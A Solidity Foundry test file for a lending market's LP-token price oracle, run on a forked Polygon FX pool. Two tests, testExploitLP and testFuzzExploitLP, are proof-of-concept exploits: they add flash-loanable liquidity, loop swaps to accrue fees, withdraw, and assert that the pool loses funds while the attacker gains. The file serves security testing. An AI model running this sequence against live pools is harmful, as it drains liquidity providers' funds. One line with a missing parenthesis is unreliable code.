pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import 'forge-std/Test.sol';
import 'forge-std/console2.sol';
import {IERC20} from '../contracts/incentives/interfaces/IERC20.sol';

import {LendingMarketTestHelper, IOracle, IAssimilator} from './LendingMarketTestHelper.t.sol';
import {hlpPriceFeedOracle, hlpContract, AggregatorV3Interface} from './HLPPriceFeedOracle.sol';
import {IAaveOracle} from '../contracts/misc/interfaces/IAaveOracle.sol';
import {ILendingPoolAddressesProvider} from '../contracts/interfaces/ILendingPoolAddressesProvider.sol';

contract HLPPriceFeedOracle is Test, LendingMarketTestHelper {
  string private RPC_URL = vm.envString('POLYGON_RPC_URL');
  address constant XSGD_ASSIM = 0xC933a270B922acBd72ef997614Ec46911747b799;
  address constant USDC_ASSIM = 0xfbdc1B9E50F8607E6649d92542B8c48B2fc49a1a;
  address user2 = address(uint160(uint256(keccak256(abi.encodePacked('user2')))));

  function setUp() public {
    vm.createSelectFork(RPC_URL, FORK_BLOCK);

    vm.prank(XSGD_HOLDER);
    IERC20(XSGD).transfer(me, 2_000_000 * 1e6);
    vm.prank(USDC_HOLDER);
    IERC20(USDC).transfer(me, 2_000_000 * 1e6);

    vm.prank(XSGD_HOLDER);
    IERC20(XSGD).transfer(user2, 2_000_000 * 1e6);
    vm.prank(USDC_HOLDER);
    IERC20(USDC).transfer(user2, 2_000_000 * 1e6);
  }

  function testLpTokenPrice() public {
    _deployReserve();
    address lpOracle = _deployAndSetLPOracle(XSGD_ASSIM, USDC_ASSIM);
    int256 lpPrice = IHLPOracle(lpOracle).latestAnswer();
    address aaveOracle = ILendingPoolAddressesProvider(LENDINGPOOL_ADDRESS_PROVIDER).getPriceOracle();
    uint256 tokenPriceInAaveOracle = (IAaveOracle(aaveOracle).getAssetPrice(IHLPOracle(lpOracle).baseContract()));

    assertEq(tokenPriceInAaveOracle, uint256(lpPrice));
    assertEq(lpOracle, IAaveOracle(aaveOracle).getSourceOfAsset(IHLPOracle(lpOracle).baseContract()));

    // console2.log('lpPrice', uint256(lpPrice));
    // console2.log('baseContract', IHLPOracle(lpOracle).baseContract());
    // console2.log('ETC/USD price', uint256(IHLPOracle(IHLPOracle(lpOracle).quotePriceFeed()).latestAnswer()));
  }

  /**
  deposit $100_000 worth of liquidity
record individual liquidity of the pool
swap 140 times
record individual liquidity of the pool (make sure it's same/very similar to before swaps)
burn all LP tokens
measure how much liquidity / tokens you received
   */

  function testLpPriceCalculation() public {
    _deployReserve();
    address lpOracle = _deployAndSetLPOracle(XSGD_ASSIM, USDC_ASSIM);
    int256 lpPrice = IHLPOracle(lpOracle).latestAnswer();
    address aaveOracle = ILendingPoolAddressesProvider(LENDINGPOOL_ADDRESS_PROVIDER).getPriceOracle();
    uint256 tokenPriceInAaveOracle = (IAaveOracle(aaveOracle).getAssetPrice(IHLPOracle(lpOracle).baseContract()));

    uint256 initialSupply = IFXPool(LP_XSGD).totalSupply();
    (uint256 initialLiquidity, uint256[] memory individualLiquidity) = IFXPool(LP_XSGD).liquidity();

    vm.startPrank(me);
    IERC20(USDC).approve(BALANCER_VAULT, type(uint256).max);
    IERC20(XSGD).approve(BALANCER_VAULT, type(uint256).max);
    vm.stopPrank();

    _addLiquidity(IFXPool(LP_XSGD).getPoolId(), 100_000 * 1e18, me, USDC, XSGD);
    // fees will be zero after deposit

    uint256 initialLPBalance = IFXPool(LP_XSGD).balanceOf(me);
    uint256 usdcAfterDeposit = IERC20(USDC).balanceOf(me);
    uint256 xsgdAfterDeposit = IERC20(XSGD).balanceOf(me);
    int256 initialPriceAfterDeposit = IHLPOracle(lpOracle).latestAnswer();

    // @todo same swaps in numeraire
    _loopSwapsExact(1, 100_000, lpOracle, false, me);
    console.log('afterSwapFees', IFXPool(LP_XSGD).totalUnclaimedFeesInNumeraire());
    console2.log('price after swap: ', IHLPOracle(lpOracle).latestAnswer());

    // _addLiquidity(IFXPool(LP_XSGD).getPoolId(), 11 * 1e18, me, USDC, XSGD);
    // console2.log('price after fee minting: ', IHLPOracle(lpOracle).latestAnswer());
    // _viewWithdraw(initialLPBalance); // supply not increased
    _removeLiquidity(IFXPool(LP_XSGD).getPoolId(), initialLPBalance, me, USDC, XSGD);
    // _viewWithdraw(initialLPBalance); // supply not increased

    (uint256 postBurnLiquidity, uint256[] memory postBurnIndividualLiquidity) = IFXPool(LP_XSGD).liquidity();

    // @todo check hehe
    console.log('initial liquidity', initialLiquidity);
    console.log('initial quote liquidity: ', individualLiquidity[0]);
    console.log('initial base liquidity: ', individualLiquidity[1]);

    console.log('postBurnLiquidity: ', postBurnLiquidity);
    console.log('postBurnIndividualLiquidity[0]: ', postBurnIndividualLiquidity[0]);
    console.log('postBurnIndividualLiquidity[1]: ', postBurnIndividualLiquidity[1]);

    console2.log('after deposit: ', initialPriceAfterDeposit);
    console2.log('after burn price: ', IHLPOracle(lpOracle).latestAnswer());

    // assertGt(IERC20(USDC).balanceOf(me), usdcAfterDeposit, 'usdc less than initial balance aafter deposit');
    // assertGt(IERC20(XSGD).balanceOf(me), xsgdAfterDeposit, 'xsgd less than initial balance aafter deposit');
    // assertEq(IFXPool(LP_XSGD).balanceOf(me), 0);
    console.log('xsgd assim price: ', IAssimilator(XSGD_ASSIM).getRate());
    console2.log('USDC Balance diff ', IERC20(USDC).balanceOf(me) - usdcAfterDeposit);
    console2.log('XSGD Balance diff ', IERC20(XSGD).balanceOf(me) - xsgdAfterDeposit);
    console2.log('USDC Balance after deposit', usdcAfterDeposit);
    console2.log('XSGD Balance after deposit', xsgdAfterDeposit);
    console2.log('USDC Balance after burn', IERC20(USDC).balanceOf(me));
    console2.log('XSGD Balance after burn', IERC20(XSGD).balanceOf(me));
  }

  function testExploitLP() public {
    address lpOracle = _deployAndSetLPOracle(XSGD_ASSIM, USDC_ASSIM);

    vm.startPrank(me);
    IERC20(USDC).approve(BALANCER_VAULT, type(uint256).max);
    IERC20(XSGD).approve(BALANCER_VAULT, type(uint256).max);
    vm.stopPrank();
    uint256 initialOraclePrice = uint256(IOracle(lpOracle).latestAnswer());

    (uint256 initialLiquidity, uint256[] memory individualLiquidity) = IFXPool(LP_XSGD).liquidity();

    uint256 usdcBeforeDeposit = IERC20(USDC).balanceOf(me);
    uint256 xsgdBeforeDeposit = IERC20(XSGD).balanceOf(me);

    // 1 - add 100k liquidity
    // can be flashloaned
    _addLiquidity(IFXPool(LP_XSGD).getPoolId(), 100_000 * 1e18, me, USDC, XSGD);

    uint256 initialLPBalance = IFXPool(LP_XSGD).balanceOf(me);
    // uint256 usdcAfterDeposit = IERC20(USDC).balanceOf(me);
    // uint256 xsgdAfterDeposit = IERC20(XSGD).balanceOf(me);

    // 2 - loop exact in numeraire 100 times. 10K in numeraire.
    _loopSwapsExact(2355, 10_000, address(lpOracle), true, user2);

    uint256 lpPriceBeforeBurn = uint256(IOracle(lpOracle).latestAnswer();
    // remove the liquidity, mint protocol fees, inflate totalSupply
    _removeLiquidity(IFXPool(LP_XSGD).getPoolId(), initialLPBalance, me, USDC, XSGD);

    // trigger without inflating supply
    (uint256 postLiquidity, uint256[] memory postIndLiquidity) = IFXPool(LP_XSGD).liquidity();
    uint256 usdcAfterBurn = IERC20(USDC).balanceOf(me);
    uint256 xsgdAfterBurn = IERC20(XSGD).balanceOf(me);

    console.log('initial liquidity', initialLiquidity);
    console.log('initial base liquidity: ', individualLiquidity[0]);
    console.log('initial quote liquidity: ', individualLiquidity[1]);
    console.log('post liquidity', postLiquidity);
    console.log('post base liquidity: ', postIndLiquidity[0]);
    console.log('post quote liquidity: ', postIndLiquidity[1]);
    console.log('initial oracle price', initialOraclePrice);
    console.log('oracle price before burn', lpPriceBeforeBurn);
    console.log('oracle price after burn', uint256(IOracle(lpOracle).latestAnswer())); // higher
    /**
  intiial unclaimed fees:  0
  intiial oracle price:  452254034096056
  initial liquidity 542450333445999999999998
  initial base liquidity:  401743725007999999999999
  initial quote liquidity:  140706608437999999999999

  post base liquidity:  418321169591999999999999
  post quote liquidity:  159011451129999999999999
  gain in liq:  34882287276000000000000
  gain in base liq:  16577444584000000000000
  gain in quote liq:  18304842692000000000000
  gain in usdcBalance:  6457
  gain in xsgdBalance:  7733

  initial: 2.8551873254
  post: 2.6307612856

 */

    // LP Balances
    console.log('gain in liq: ', postLiquidity - initialLiquidity);
    console.log('gain in base liq: ', postIndLiquidity[0] - individualLiquidity[0]);
    console.log('gain in quote liq: ', postIndLiquidity[1] - individualLiquidity[1]);

    // user: me
    console.log('gain in usdcBalance: ', (usdcAfterBurn - usdcBeforeDeposit) / 1e6);
    console.log('gain in xsgdBalance: ', (xsgdAfterBurn - xsgdBeforeDeposit) / 1e6);
  }

  function testFuzzExploitLP(uint256 amount) public {
    vm.assume(amount > 10_000);
    vm.assume(amount < 100_000);
    address lpOracle = _deployAndSetLPOracle(XSGD_ASSIM, USDC_ASSIM);

    vm.startPrank(me);
    IERC20(USDC).approve(BALANCER_VAULT, type(uint256).max);
    IERC20(XSGD).approve(BALANCER_VAULT, type(uint256).max);
    vm.stopPrank();

    // 1 - add 100k liquidity
    // can be flashloaned
    _addLiquidity(IFXPool(LP_XSGD).getPoolId(), 100_000 * 1e18, me, USDC, XSGD);

    (uint256 initialLiquidity, uint256[] memory individualLiquidity) = IFXPool(LP_XSGD).liquidity();
    console.log('initial liquidity', initialLiquidity);
    console.log('initial base liquidity: ', individualLiquidity[0]);
    console.log('initial quote liquidity: ', individualLiquidity[1]);

    uint256 initialLPBalance = IFXPool(LP_XSGD).balanceOf(me);
    uint256 usdcAfterDeposit = IERC20(USDC).balanceOf(me);
    uint256 xsgdAfterDeposit = IERC20(XSGD).balanceOf(me);

    // 2 - loop exact in numeraire 100 times. 10K in numeraire
    _loopSwapsExact(100, 10_000, address(lpOracle), true, user2);

    // remove the liquidity, mint protocol fees, inflate totalSupply
    _removeLiquidity(IFXPool(LP_XSGD).getPoolId(), initialLPBalance, me, USDC, XSGD);

    // trigger without inflating supply
    // _viewWithdraw(initialLPBalance); // supply not increased
    (uint256 postLiquidity, uint256[] memory postIndLiquidity) = IFXPool(LP_XSGD).liquidity();
    uint256 usdcAfterBurn = IERC20(USDC).balanceOf(me);
    uint256 xsgdAfterBurn = IERC20(XSGD).balanceOf(me);
    console.log('post liquidity', postLiquidity);
    console.log('post base liquidity: ', postIndLiquidity[0]);
    console.log('post quote liquidity: ', postIndLiquidity[1]);

    // Extract more assets in LP
    console.log('loss in liq: ', initialLiquidity - postLiquidity);
    console.log('loss in base liq: ', individualLiquidity[0] - postIndLiquidity[0]);
    console.log('loss in quote liq: ', individualLiquidity[1] - postIndLiquidity[1]);
    console.log('gain in usdcBalance: ', (usdcAfterBurn - usdcAfterDeposit));
    console.log('gain in xsgdBalance: ', (xsgdAfterBurn - xsgdAfterDeposit));

    // assert pool losses
    assertGt(individualLiquidity[0], postIndLiquidity[0]);
    assertGt(individualLiquidity[1], postIndLiquidity[1]);
    assertGt(initialLiquidity, postLiquidity);

    // assert user gains
    assertGt(usdcAfterBurn, usdcAfterDeposit);
    assertGt(xsgdAfterBurn, xsgdAfterDeposit);
  }

  function __testPriceManipulation() private {
    _deployReserve();

    address lpOracle = _deployAndSetLPOracle(XSGD_ASSIM, USDC_ASSIM);

    _doSwap(me, 130_000 * 1e6, USDC, XSGD);
    _loopSwaps(6, 10_000, lpOracle, true, me);
  }

  function testUnclaimedFees() public {
    _deployReserve();

    address lpOracle = _deployAndSetLPOracle(XSGD_ASSIM, USDC_ASSIM);
    int256 oraclePriceBeforeSwaps = IOracle(lpOracle).latestAnswer();

    uint256 initialSupply = IFXPool(LP_XSGD).totalSupply();
    (uint256 initialLiquidity, ) = IFXPool(LP_XSGD).liquidity();

    uint256 initial = IFXPool(LP_XSGD).totalUnclaimedFeesInNumeraire();
    console2.log('before loop unclaimed fees: ', initial);
    _loopSwaps(247, 10_000, address(lpOracle), true, me);

    // trigger minting
    _addLiquidity(IFXPool(LP_XSGD).getPoolId(), 10 * 1e18, me, USDC, XSGD);

    uint256 endSupply = IFXPool(LP_XSGD).totalSupply();
    (uint256 endLiquidity, ) = IFXPool(LP_XSGD).liquidity();

    int256 oraclePriceAfterSwaps = IOracle(lpOracle).latestAnswer();

    console2.log('end liquidity', endLiquidity);
    console2.log('end supply', endSupply);
    console2.log('supply diff', endSupply - initialSupply);
    console2.log('liquidity diff', endLiquidity - initialLiquidity);
    console2.log('after loop unclaimed fees: ', IFXPool(LP_XSGD).totalUnclaimedFeesInNumeraire());
    assertEq(IFXPool(LP_XSGD).totalUnclaimedFeesInNumeraire(), 0);
    assertGt(endLiquidity, initialLiquidity);
    assertGt(endSupply, initialSupply);
    assertGt(oraclePriceAfterSwaps, oraclePriceBeforeSwaps);
  }

  // function testFuzz_FuzzLoopTimesUnclaimedFees(uint256 loopTimes) public {
  //   vm.assume(loopTimes < 247);
  //   vm.assume(loopTimes > 12);

  //   _deployReserve();

  //   address lpOracle = _deployAndSetLPOracle(XSGD_ASSIM, USDC_ASSIM);

  //   uint256 initialSupply = IFXPool(LP_XSGD).totalSupply();
  //   (uint256 initialLiquidity, ) = IFXPool(LP_XSGD).liquidity();

  //   uint256 initial = IFXPool(LP_XSGD).totalUnclaimedFeesInNumeraire();
  //   console2.log('before loop unclaimed fees: ', initial);
  //   _loopSwaps(loopTimes, 10_000, address(lpOracle), true);

  //   // trigger minting
  //   _addLiquidity(IFXPool(LP_XSGD).getPoolId(), 10 * 1e18, me, USDC, XSGD);

  //   uint256 endSupply = IFXPool(LP_XSGD).totalSupply();
  //   (uint256 endLiquidity, ) = IFXPool(LP_XSGD).liquidity();

  //   console2.log('end liquidity', endLiquidity);
  //   console2.log('end supply', endSupply);
  //   console2.log('supply diff', endSupply - initialSupply);
  //   console2.log('liquidity diff', endLiquidity - initialLiquidity);
  //   console2.log('after loop unclaimed fees: ', IFXPool(LP_XSGD).totalUnclaimedFeesInNumeraire());
  //   assertEq(IFXPool(LP_XSGD).totalUnclaimedFeesInNumeraire(), 0);
  //   assertGt(endLiquidity, initialLiquidity);
  //   assertGt(endSupply, initialSupply);
  // }

  function _viewWithdraw(uint256 tokensToBurn) internal returns (uint256 tA, uint256 tB) {
    uint256[] memory tokensReturned = IFXPool(LP_XSGD).viewWithdraw(tokensToBurn);
    // [0] base, [1] quote
    tA = tokensReturned[0]; // base
    tB = tokensReturned[1]; // quote

    console2.log('getRate ', IAssimilator(XSGD_ASSIM).getRate());
    console2.log('eth usd: ', uint256(IOracle(ETH_USD_ORACLE).latestAnswer()));
    console2.log('_viewWithdraw tA RAW: ', tA);
    console2.log('_viewWithdraw tA NUMERAIRE ', _convertToNumeraire(tA, XSGD_ASSIM));
    console2.log('_viewWithdraw tB RAW: ', tB);
    console2.log('_viewWithdraw tB NUMERAIRE: ', _convertToNumeraire(tB, USDC_ASSIM));

    uint256 totalNumeraireAmount = _convertToNumeraire(tA, XSGD_ASSIM) + _convertToNumeraire(tB, USDC_ASSIM);

    console.log('_viewWithdraw  totalNumeraireAmount', totalNumeraireAmount);
    console.log(
      '_viewWithdraw oracle price',
      ((((((totalNumeraireAmount * 1e18) / uint256(IOracle(ETH_USD_ORACLE).latestAnswer())))) * 1e18) / tokensToBurn) /
        1e10
    );
  }
}

interface IHLPOracle {
  function baseContract() external view returns (address);

  function quotePriceFeed() external view returns (address);

  function latestAnswer() external view returns (int256);
}

interface IFiatToken {
  function mint(address to, uint256 amount) external;

  function configureMinter(address minter, uint256 minterAllowedAmount) external;

  function masterMinter() external view returns (address);

  function increaseMinterAllowance(address _minter, uint256 _increasedAmount) external view;
}

interface IVault {
  function joinPool(bytes32 poolId, address sender, address recipient, JoinPoolRequest memory request) external payable;

  struct JoinPoolRequest {
    IAsset[] assets;
    uint256[] maxAmountsIn;
    bytes userData;
    bool fromInternalBalance;
  }

  function exitPool(bytes32 poolId, address sender, address payable recipient, ExitPoolRequest memory request) external;

  struct ExitPoolRequest {
    IAsset[] assets;
    uint256[] minAmountsOut;
    bytes userData;
    bool toInternalBalance;
  }

  enum SwapKind {
    GIVEN_IN,
    GIVEN_OUT
  }

  function batchSwap(
    SwapKind kind,
    BatchSwapStep[] memory swaps,
    IAsset[] memory assets,
    FundManagement memory funds,
    int256[] memory limits,
    uint256 deadline
  ) external payable returns (int256[] memory);

  struct BatchSwapStep {
    bytes32 poolId;
    uint256 assetInIndex;
    uint256 assetOutIndex;
    uint256 amount;
    bytes userData;
  }

  /**
   * @dev Emitted for each individual swap performed by `swap` or `batchSwap`.
   */
  event Swap(
    bytes32 indexed poolId,
    IERC20 indexed tokenIn,
    IERC20 indexed tokenOut,
    uint256 amountIn,
    uint256 amountOut
  );

  struct FundManagement {
    address sender;
    bool fromInternalBalance;
    address payable recipient;
    bool toInternalBalance;
  }
}

interface IAsset {
  // solhint-disable-previous-line no-empty-blocks
}

interface IFXPool {
  struct Assimilator {
    address addr;
    uint8 ix;
  }

  function getPoolId() external view returns (bytes32);

  function viewParameters() external view returns (uint256, uint256, uint256, uint256, uint256);

  // returns(totalLiquidityInNumeraire, individual liquidity)
  function liquidity() external view returns (uint256, uint256[] memory);

  function totalSupply() external view returns (uint256);

  function balanceOf(address) external view returns (uint256);

  function totalUnclaimedFeesInNumeraire() external view returns (uint256);

  function viewWithdraw(uint256) external view returns (uint256[] memory);
}

interface IERC20Detailed {
  function decimals() external view returns (uint8);
}
